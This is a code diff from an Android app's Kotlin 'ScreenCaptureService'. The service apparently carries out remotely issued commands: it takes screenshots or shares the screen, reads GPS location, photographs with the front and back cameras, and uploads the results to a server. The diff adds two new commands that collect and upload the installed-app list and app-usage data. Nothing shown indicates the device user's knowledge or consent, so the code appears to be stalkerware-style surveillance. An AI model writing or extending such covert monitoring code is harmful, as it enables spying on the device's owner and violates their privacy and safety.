@@ -125,41 +125,52 @@ class ScreenCaptureService : Service() {
         }
     }
 
-    private fun handleRequest(req: JSONObject) {
-        val id   = req.getString("_id")
-        val type = req.getString("type")
-        thread {
-            try {
-                when (type) {
-                    "SCREENSHOT", "SCREEN_SHARE" -> {
-                        if (projection == null || reader == null) {
-                            api.updateStatus(id, "FAILED"); return@thread
-                        }
-                        val b64 = capture()
-                        if (b64 != null) api.updateStatus(id, "DONE", api.uploadImage(b64))
-                        else api.updateStatus(id, "FAILED")
+private fun handleRequest(req: JSONObject) {
+    val id   = req.getString("_id")
+    val type = req.getString("type")
+    thread {
+        try {
+            when (type) {
+                "SCREENSHOT", "SCREEN_SHARE" -> {
+                    if (projection == null || reader == null) {
+                        api.updateStatus(id, "FAILED"); return@thread
                     }
-
-                    // ✅ Lokatsiya so'rovi
-                    "LOCATION" -> {
-                        val loc = LocationHelper(this).getLocation()
-                        if (loc != null) {
-                            val (lat, lng) = loc
-                            api.updateStatus(id, "DONE", "$lat,$lng")
-                        } else {
-                            api.updateStatus(id, "FAILED")
-                        }
-                    }
-
-                    "CAMERA_FRONT" -> shootCamera(id, CameraCharacteristics.LENS_FACING_FRONT)
-                    "CAMERA_BACK"  -> shootCamera(id, CameraCharacteristics.LENS_FACING_BACK)
-                    else -> api.updateStatus(id, "FAILED")
+                    val b64 = capture()
+                    if (b64 != null) api.updateStatus(id, "DONE", api.uploadImage(b64))
+                    else api.updateStatus(id, "FAILED")
                 }
-            } catch (e: Exception) {
-                try { api.updateStatus(id, "FAILED") } catch (_: Exception) {}
+
+                "LOCATION" -> {
+                    val loc = LocationHelper(this).getLocation()
+                    if (loc != null) {
+                        val (lat, lng) = loc
+                        api.updateStatus(id, "DONE", "$lat,$lng")
+                    } else {
+                        api.updateStatus(id, "FAILED")
+                    }
+                }
+
+                "CAMERA_FRONT" -> shootCamera(id, CameraCharacteristics.LENS_FACING_FRONT)
+                "CAMERA_BACK"  -> shootCamera(id, CameraCharacteristics.LENS_FACING_BACK)
+
+                "APP_LIST" -> {
+                    val json = AppHelper(this).getInstalledApps()
+                    api.updateStatus(id, "DONE", api.uploadJson(json))
+                }
+
+                "APP_USAGE" -> {
+                    val json = AppHelper(this).getAppUsage()
+                    if (json == "[]") api.updateStatus(id, "FAILED")
+                    else api.updateStatus(id, "DONE", api.uploadJson(json))
+                }
+
+                else -> api.updateStatus(id, "FAILED")
             }
+        } catch (e: Exception) {
+            try { api.updateStatus(id, "FAILED") } catch (_: Exception) {}
         }
     }
+}
 
     private fun shootCamera(id: String, facing: Int) {
         val b64 = CameraHelper(this).capturePhoto(facing)
